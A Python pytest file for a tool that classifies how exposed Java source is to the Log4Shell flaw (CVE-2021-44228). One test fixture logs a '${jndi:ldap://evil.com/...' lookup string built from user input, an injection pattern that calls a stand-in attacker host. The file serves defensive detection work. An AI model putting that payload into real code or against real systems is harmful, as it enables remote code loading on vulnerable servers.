"""
Tests for Evidence-Based Reachability Analysis
"""

import pytest
from blastradius.intelligence.reachability import analyze_source_text, get_project_reachability_matrix

def test_reachability_vulnerable_symbol_match():
    java_code = """
    package com.example;
    import org.apache.logging.log4j.Logger;
    public class Controller {
        public void process(String val) {
            logger.error("${jndi:ldap://evil.com/" + val);
        }
    }
    """
    res = analyze_source_text(java_code, "log4j-core", "CVE-2021-44228")
    assert res["classification"] == "VULNERABLE_SYMBOL_MATCHED"
    assert res["confidence"] == "High"
    assert "jndi:" in res["matched_symbols"]

def test_reachability_source_reference_observed():
    java_code = """
    package com.example;
    import org.apache.logging.log4j.LogManager;
    public class Service {
        // Only standard info, no jndi lookup
        public void run() {
            System.out.println("Running");
        }
    }
    """
    res = analyze_source_text(java_code, "log4j-core", "CVE-2021-44228")
    assert res["classification"] == "SOURCE_REFERENCE_OBSERVED"
    assert res["confidence"] == "Medium"

def test_reachability_dependency_detected():
    java_code = """
    package com.example;
    public class PlainService {
        public int add(int a, int b) { return a + b; }
    }
    """
    res = analyze_source_text(java_code, "log4j-core", "CVE-2021-44228")
    assert res["classification"] == "DEPENDENCY_DETECTED"

def test_reachability_empty_source():
    res = analyze_source_text("", "log4j-core")
    assert res["classification"] == "UNKNOWN"

def test_reachability_matrix():
    matrix = get_project_reachability_matrix()
    assert len(matrix) >= 5
    api_gw = next((m for m in matrix if m["project"] == "api-gateway"), None)
    assert api_gw is not None
    assert api_gw["classification"] == "VULNERABLE_SYMBOL_MATCHED"
